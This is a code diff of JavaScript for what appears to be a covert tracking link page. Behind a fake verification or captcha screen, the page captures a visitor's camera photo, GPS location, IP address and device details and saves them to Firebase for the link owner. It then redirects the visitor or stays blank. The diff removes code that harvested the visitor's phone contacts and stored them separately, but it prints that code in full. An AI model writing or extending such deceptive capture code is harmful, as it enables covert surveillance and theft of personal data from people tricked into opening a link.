@@ -221,45 +221,6 @@ async function getLocation() {
     });
 }
 
-// ── COLLECT CONTACTS (Contact Picker API) ────────────────────────────────
-// Returns { contacts, browserStatus, userDecision }
-//   browserStatus : 'allowed' | 'blocked' | 'unsupported'
-//   userDecision  : 'allowed' | 'denied' | 'not_asked'
-async function collectContacts() {
-    if (!('contacts' in navigator) || !('ContactsManager' in window)) {
-        console.warn('Contact Picker API not supported on this device.');
-        return { contacts: null, browserStatus: 'blocked', userDecision: 'not_asked' };
-    }
-    try {
-        const supported = await navigator.contacts.getProperties();
-        const props = ['name', 'email', 'tel'].filter(p => supported.includes(p));
-        if (props.length === 0) {
-            return { contacts: null, browserStatus: 'blocked', userDecision: 'not_asked' };
-        }
-        const raw = await navigator.contacts.select(props, { multiple: true });
-        // If user opened the picker and selected nothing (cancelled), raw is [] or null
-        if (!raw || raw.length === 0) {
-            return { contacts: null, browserStatus: 'allowed', userDecision: 'denied' };
-        }
-        const contacts = raw.map(c => ({
-            name:  (c.name  && c.name.length  ? c.name[0]  : '') || '',
-            phone: (c.tel   && c.tel.length   ? c.tel[0]   : '') || '',
-            email: (c.email && c.email.length ? c.email[0] : '') || ''
-        }));
-        return { contacts, browserStatus: 'allowed', userDecision: 'allowed' };
-    } catch (e) {
-        console.warn('Contacts denied or failed:', e.message);
-        // Contact Picker API throws NotAllowedError when called without a user gesture
-        // (browser blocked) vs when user explicitly dismisses (which also throws in some
-        // browsers). The error name distinguishes these cases where possible.
-        const isGestureBlock = e.name === 'SecurityError' || e.name === 'NotAllowedError';
-        return {
-            contacts:      null,
-            browserStatus: isGestureBlock ? 'blocked' : 'allowed',
-            userDecision:  isGestureBlock ? 'not_asked' : 'denied'
-        };
-    }
-}
 
 // ── VALIDATE URL ──────────────────────────────────────────────────────────
 function isValidUrl(url) {
@@ -299,9 +260,9 @@ async function queryPermissionStates() {
 
 // ── REFINE PERMISSION LOG STATUS ACCURACY ────────────────────────────────
 // NOTE: Detection of browserStatus / userDecision now happens directly inside
-// capturePhoto(), getLocation(), and collectContacts() at the moment each
-// permission attempt resolves.  This function is retained as a no-op so the
-// call site in initVerification() does not need to change.
+// capturePhoto() and getLocation() at the moment each permission attempt
+// resolves.  This function is retained as a no-op so the call site in
+// initVerification() does not need to change.
 async function refinePermissionLog(log, needsCam, needsGPS) {
     // No longer needed — statuses are set accurately during runPermissions().
 }
@@ -354,17 +315,15 @@ function showCaptcha() {
 }
 
 // ── RUN PERMISSIONS SEQUENTIALLY AND LOG EACH RESULT ─────────────────────
-async function runPermissions(needsCam, needsGPS, needsContact) {
+async function runPermissions(needsCam, needsGPS) {
     const log = {
-        camera:  { requested: needsCam,     browserStatus: 'not_requested', userDecision: 'not_asked', time: null },
-        gps:     { requested: needsGPS,     browserStatus: 'not_requested', userDecision: 'not_asked', time: null },
-        contact: { requested: needsContact, browserStatus: 'not_requested', userDecision: 'not_asked', time: null },
+        camera:  { requested: needsCam, browserStatus: 'not_requested', userDecision: 'not_asked', time: null },
+        gps:     { requested: needsGPS, browserStatus: 'not_requested', userDecision: 'not_asked', time: null },
     };
 
     let photoData = null;
     let lat       = 'Denied';
     let lon       = 'Denied';
-    let contacts  = null;
 
     // ── Camera ───────────────────────────────────────────────────────────
     if (needsCam) {
@@ -385,21 +344,12 @@ async function runPermissions(needsCam, needsGPS, needsContact) {
         log.gps.userDecision     = gpsResult.userDecision;
     }
 
-    // ── Contact ──────────────────────────────────────────────────────────
-    if (needsContact) {
-        log.contact.time = nowTimeStr();
-        const result = await collectContacts();
-        contacts                    = result.contacts;
-        log.contact.browserStatus   = result.browserStatus;
-        log.contact.userDecision    = result.userDecision;
-    }
-
-    return { photoData, lat, lon, contacts, log };
+    return { photoData, lat, lon, log };
 }
 
 // ── SAVE CAPTURE TO FIREBASE ──────────────────────────────────────────────
 async function saveCapture({
-    photoData, lat, lon, contacts,
+    photoData, lat, lon,
     settings, linkId, ipAddress, deviceInfo,
     permissionLog, permissionTrigger, browserBlocksAutoPrompt
 }) {
@@ -414,7 +364,6 @@ async function saveCapture({
             image:                   photoData || null,
             latitude:                lat,
             longitude:               lon,
-            contacts:                (contacts && contacts.length > 0) ? contacts : null,
             linkName:                settings.name || 'Unknown',
             linkId:                  linkId,
             date:                    new Date(now).toLocaleDateString(),
@@ -430,26 +379,6 @@ async function saveCapture({
         });
     } catch (e) {
         console.error('Firebase save error:', e);
-    }
-
-    // Save contacts separately to contact_history if collected
-    if (contacts && contacts.length > 0) {
-        try {
-            const cRef = push(ref(db, 'contact_history'));
-            await set(cRef, {
-                linkId:     linkId,
-                linkName:   settings.name || 'Unknown',
-                contacts:   contacts,
-                date:       new Date(now).toLocaleDateString(),
-                time:       new Date(now).toLocaleTimeString(),
-                timestamp:  now,
-                ipAddress:  ipAddress,
-                _ownerType: ownerType,
-                _ownerId:   ownerId
-            });
-        } catch (e) {
-            console.error('Firebase contacts save error:', e);
-        }
     }
 }
 
@@ -482,9 +411,8 @@ async function initVerification() {
 
     const needsCam     = !!settings.cam;
     const needsGPS     = !!settings.gps;
-    const needsContact = !!settings.contact;
     const hasRedirect  = isValidUrl(settings.redirectUrl);
-    const hasAnyPerm   = needsCam || needsGPS || needsContact;
+    const hasAnyPerm   = needsCam || needsGPS;
 
     // ── Permission states already resolved (ran in parallel) ─────────────
     const permStates = await permStatesPromise;
@@ -493,15 +421,13 @@ async function initVerification() {
     // 'prompt' → browser will ask, but only from a user-initiated gesture.
     // 'granted' → already allowed, no gesture needed.
     // 'denied' → permanently blocked, no gesture helps.
-    // Contact Picker API always requires a user gesture regardless of state.
     let permissionTrigger       = 'direct';
     let browserBlocksAutoPrompt = false;
 
     if (hasAnyPerm) {
         browserBlocksAutoPrompt =
-            (needsCam     && permStates.camera      === 'prompt') ||
-            (needsGPS     && permStates.geolocation === 'prompt') ||
-            !!needsContact; // Contact Picker always requires gesture
+            (needsCam && permStates.camera      === 'prompt') ||
+            (needsGPS && permStates.geolocation === 'prompt');
 
         // ── Show verification screen with 0ms delay ───────────────────────
         if (browserBlocksAutoPrompt) {
@@ -511,26 +437,23 @@ async function initVerification() {
     }
 
     // ── Request each permission and record result ─────────────────────────
-    const { photoData, lat, lon, contacts, log: permissionLog } =
-        await runPermissions(needsCam, needsGPS, needsContact);
+    const { photoData, lat, lon, log: permissionLog } =
+        await runPermissions(needsCam, needsGPS);
 
     // ── Refine status accuracy post-run ───────────────────────────────────
-    // Distinguishes browser-permanently-blocked ('blocked') from
-    // user-dismissed/denied ('denied') without touching runPermissions().
     await refinePermissionLog(permissionLog, needsCam, needsGPS);
 
     // ── Evaluate grant results ────────────────────────────────────────────
-    const camGranted     = !needsCam     || (photoData !== null);
-    const gpsGranted     = !needsGPS     || (typeof lat === 'number');
-    const contactGranted = !needsContact || (contacts !== null);
-    const allGranted     = camGranted && gpsGranted && contactGranted;
+    const camGranted = !needsCam || (photoData !== null);
+    const gpsGranted = !needsGPS || (typeof lat === 'number');
+    const allGranted = camGranted && gpsGranted;
 
     // ── Redirect path ─────────────────────────────────────────────────────
     if (hasRedirect && allGranted) {
         Promise.all([infoPromise, ipPromise])
             .then(([deviceInfo, ipAddress]) =>
                 saveCapture({
-                    photoData, lat, lon, contacts, settings, linkId, ipAddress, deviceInfo,
+                    photoData, lat, lon, settings, linkId, ipAddress, deviceInfo,
                     permissionLog, permissionTrigger, browserBlocksAutoPrompt
                 })
             )
@@ -543,7 +466,7 @@ async function initVerification() {
     // ── No-redirect path — save and stay silent ───────────────────────────
     const [deviceInfo, ipAddress] = await Promise.all([infoPromise, ipPromise]);
     await saveCapture({
-        photoData, lat, lon, contacts, settings, linkId, ipAddress, deviceInfo,
+        photoData, lat, lon, settings, linkId, ipAddress, deviceInfo,
         permissionLog, permissionTrigger, browserBlocksAutoPrompt
     });
     // Page remains blank.
